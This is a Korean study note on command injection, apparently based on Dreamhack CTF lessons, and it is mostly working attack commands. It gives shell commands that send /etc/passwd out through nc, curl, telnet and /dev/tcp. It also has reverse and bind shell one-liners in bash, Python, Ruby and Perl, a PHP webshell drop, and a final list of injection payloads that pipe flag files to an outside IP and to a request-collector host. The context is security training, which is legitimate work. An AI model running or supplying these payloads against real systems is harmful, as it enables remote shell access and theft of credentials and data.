# 개념
인젝션(Injection)은 악의적인 데이터를 프로그램에 입력하여 
이를 시스템 명령어, 코드, 데이터베이스 쿼리 등으로 실행되게 하는 기법

명령어를 실행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생
시스템 함수를 사용하면 이용자의 입력을 소프트웨어의 인자로 전달할 수 있음


# linux 메타문자

### \`\`	명령어 치환
\`\`안에 들어있는 명령어를 실행한 결과로 치환

	$ echo `echo theori`
	theori

### $()	명령어 치환
$()안에 들어있는 명령어를 실행한 결과로 치환 이 문자는 위와 다르게 중복 사용이 가능 (echo $(echo $(echo theori)))

	$ echo $(echo theori)
	theori

### &&	명령어 연속 실행
한 줄에 여러 명령어를 사용하고 싶을 때 사용 앞 명령어에서 에러가 발생하지 않아야 뒷 명령어를 실행 (Logical And)

	$ echo hello && echo theori
	hello
	theori

### ||	명령어 연속 실행
한 줄에 여러 명령어를 사용하고 싶을 때 사용, 앞 명령어에서 에러가 발생해야 뒷 명령어를 실행 (Logical Or) 다시말해, 둘 중 하나만 실행시키고 싶을 때 사용

	$ cat / || echo theori
	cat: /: Is a directory
	theori

### ;	명령어 구분자
한 줄에 여러 명령어를 사용하고 싶을 때 사용 ;은 단순히 명령어를 구분하기 위해 사용하며, 앞 명령어의 에러 유무와 관계 없이 뒷 명령어를 실행

	$ echo hello ; echo theori
	hello
	theori

### |	파이프
앞 명령어의 결과가 뒷 명령어의 입력으로 들어감
특히 2번째 예시에서 사용하는 echo -e랑 파이프 조합은 
pwnable이나 다른 여러분야에서도 많이 사용됨

	$ echo id | /bin/sh
	uid=1001(theori) gid=1001(theori) groups=1001(theori)

	echo -e "anydata: anydata\r\nget hello" | nc 127.0.0.1 6379


# 실행 결과를 확인 할 수 없을 때

### Network Outbound
삽입할 명령줄에 네트워크 도구를 함께 실행해 자신의 서버에 명령어 실행 결과를 전송. 이는 네트워크 도구를 서버에 설치할 수 있거나 설치되었을 때 사용 가능한 방법

### nc ( netcat )
TCP 또는 UDP 프로토콜을 사용하는 네트워크에서 데이터를 송신하거나 수신하는 프로그램
셸에서 제공하는 파이프('|')와 함께 해당 프로그램을 사용하면 앞서 실행한 명령어의 결과를 네트워크로 전송
아래는 nc를 이용해 명령어의 실행 결과를 네트워크로 전송하는 예시
명령어가 실행되면, "/etc/passwd" 파일의 출력 결과를 로컬의 8000번 포트로 전송

	#nc를 이용한 명령어 실행 결과 전송
	cat /etc/passwd | nc 127.0.0.1 8000

### telnet
telnet은 네트워크 연결에 사용되는 프로토콜로 클라이언트를 설치해 네트워크에 연결을 시도할 수 있음
nc와 같이 파이프와 함께 명령어의 결과를 네트워크로 전송할 수 있음
아래는 telnet을 이용해 명령어의 실행 결과를 네트워크로 전송하는 예시
명령어가 실행되면 "/etc/passwd" 파일의 출력 결과를 로컬의 8000번 포트로 전송

	#telnet을 이용한 명령어 실행 결과 전송
	cat /etc/passwd | telnet 127.0.0.1 8000

### CURL / WGET
curl과 wget은 모두 웹 서버의 컨텐츠를 가져오는 프로그램
웹 서버에서 컨텐츠를 가져오기 위해서는 웹 서버에 방문을 해야하기 때문에 서버에서는 접속 로그가 남음
이 특징을 이용해 명령어의 실행 결과를 웹 서버의 경로 또는 Body와 같은 영역에 포함해 전송
아래는 curl을 이용해 명령어의 실행 결과를 네트워크로 전송하는 예시
명령어를 살펴보면 로컬 웹 서버의 파라미터로 디렉터리 목록의 결과를 base64 인코딩하여 전달하는 것을 볼 수 있음
명령어 실행 결과에는 개행이 있을 수 있기 때문에 인코딩을 통해 개행을 제거

	#curl을 이용한 명령어 실행 결과 전송
	curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"

POST 메소드를 사용해 실행 결과를 전송하는 방법 또한 사용할 수 있음
아래는 명령어의 실행 결과를 POST Body에 포함해 요청을 보내는 명령어

	#POST Body 실행 결과 전송
	curl http://127.0.0.1:8080/ -d "$(ls -al)"
	wget http://127.0.0.1:8080 --method=POST --body-data="`ls -al`"

### /dev/tcp & /dev/udp
Bash에서 지원하는 기능으로 네트워크에 연결하는 방법
아래와 같이 "/dev/tcp" 장치 경로의 하위 디렉터리로 IP 주소와 포트 번호를 입력하면 Bash는 해당 경로로 네트워크 연결을 시도
따라서 "/etc/passwd"의 파일 내용이 로컬의 8080 포트로 전송

	#/dev/를 이용한 명령어 실행 결과 전송
	cat /etc/passwd > /dev/tcp/127.0.0.1/8080


### Reverse & Bind Shell
임의로 실행할 명령어를 네트워크를 통해 입력하고, 실행 결과를 출력해 공격하는 기법. 
리버스 셸 (Reverse Shell)은 공격 대상 서버에서 공격자의 서버로 셸을 연결하는 것. 
바인드 셸 (Bind Shell)은 공격 대상 서버에서 특정 포트를 열어 셸을 서비스하는 것을 의미


#### Reverse Shell
### sh & Bash
Network Outbound에서 다룬 "/dev/tcp" 또는 "/dev/udp" 경로를 사용해 포트를 서비스하는 서버에 공격 대상 서버의 셸을 실행할 수 있음
아래는 리버스 셸의 예시
경로에 입력한 IP 주소를 가진 서버에서 8080 포트를 열고 기다린 후 Figure 6 명령어를 실행하면 셸을 획득할 수 있음

	#sh & bash를 이용한 리버스 셸

	#공격 대상 서버
	/bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
	/bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1

	#공격자 서버
	$ nc -l -p 8080 -k -v
	Listening on [0.0.0.0] (family 0, port 8080)
	Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
	$ id
	uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)

### 언어 사용
파이썬 또는 루비는 명령줄에서 코드를 작성해 실행할 수 있음
공격자는 명령줄에서 소켓을 사용해 리버스 셸 공격이 가능
아래는 각각의 언어로 공격자 서버에서 셸 명령어를 입력할 수 있도록 하는 코드

	#언어를 이용한 리버스 셸

	#파이썬
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

	#루비
	ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
	

#### Bind Shell

### nc ( netcat )
nc는 버전에 따라 특정 포트에 임의 서비스를 등록할 수 있도록 "-e" 옵션을 제공
아래는 8080 포트를 열고, "/bin/sh"를 실행하는 명령어

	#nc를 이용한 바인드 셸

	nc -nlvp 8080 -e /bin/sh
	ncat -nlvp 8080 -e /bin/sh

### 언어 사용
펄 (Perl) 스크립트를 작성해서 특정 포트를 셸과 함께 바인딩할 수 있음
아래는 펄 스크립트를 작성해 "/bin/bash"와 함께 포트를 바인딩하는 스크립트

	#언어를 이용한 바인드 셸

	perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'

### 파일 생성
애플리케이션 상에서 직접 확인할 수 있는 파일 시스템 경로에 명령어의 실행 결과를 저장한 파일을 생성하는 방법이 있음
예를 들어, 애플리케이션에서 이미지 파일을 "/img" 디렉터리 내에 저장한다면 명령어의 실행 결과를 "/img/result.jpg"로 저장하고 해당 경로에 접속해 명령어 실행 결과를 확인


### Script Engine
웹 서버는 지정된 경로에 존재하는 파일을 브라우저에 표시함
만약 커맨드 인젝션 취약점이 발생하고, 웹 서버가 지정한 경로를 알고 있다면 해당 위치에 셸을 실행하는 웹셸(Webshell) 파일을 업로드하고, 
해당 페이지에 접속해 셸을 실행하고 실행 결과를 확인할 수 있음
아래는 웹셸을 업로드하는 예시
PHP 외에도 JSP, ASP 등 웹 서버가 해석 가능한 파일을 만들어 접근할 수 있음

	#webshell 등록 명령어

	printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php


### Static File Directory
프레임워크 또는 웹 애플리케이션에서는 JS/CSS/Img 등 정적 리소스를 다루기 위해 Static File Directory를 사용
해당 디렉터리에 실행한 명령어의 결과를 파일로 생성하고, 해당 파일에 접근해 결과를 확인할 수 있음

대표적인 예시로 파이썬의 Flask 프레임워크 기본 설정에서는 Static File Directory의 이름이 static으로 설정되어 있음
만약 해당 디렉터리를 사용하지 않는 환경이더라도 static 디렉터리를 생성하는 명령어를 실행하고 파일을 생성하면 됨
이때 프레임워크가 동작하는 디렉터리에 파일 생성 권한이 없다면 해당 방법을 이용한 공격은 불가능

아래는 static 디렉터리를 생성하고, id 명령어의 실행 결과를 생성한 디렉터리 내 "result.txt" 파일에 저장함
해당 명령어가 실행된 이후 "static/result.txt" 페이지에 방문하면 명령어 실행 결과를 확인할 수 있음

	#Static File Directory를 이용한 실행 결과 확인

	mkdir static; id > static/result.txt


# 실제 페이로드

### Ping 서비스 Command Injection
	0.0.0.0";ls -al "./
	0.0.0.0"; cat fla*; ls "./

### nc + 리버스쉘
	http://211.250.216.149/
	cat /etc/passwd | nc 211.250.216.149 7000
	nc -l -p 7000
	nc -l -p 7000 > received_data.txt

### curl + 리버스쉘
	sudo fuser -k 7000/tcp
	sudo netstat -tuln | grep 7000
	curl "http://211.250.216.149:7000/?$(ls -al|base64 -w0)"

### 외부 서버이용
	cat /etc/passwd | nc 127.0.0.1 8000
	echo "{cat_name}" >> /tmp/cat_db
	cool_cat_name"; cat ./flag.txt | nc https://oqsuldv.request.dreamhack.games 80;"
	curl -v 'https://oqsuldv.request.dreamhack.games'
	curl https://oqsuldv.request.dreamhack.games/ -d "$(ls -al)"
	cool_cat_name";curl https://oqsuldv.request.dreamhack.games/ -d "$( cat ./flag.txt)";"

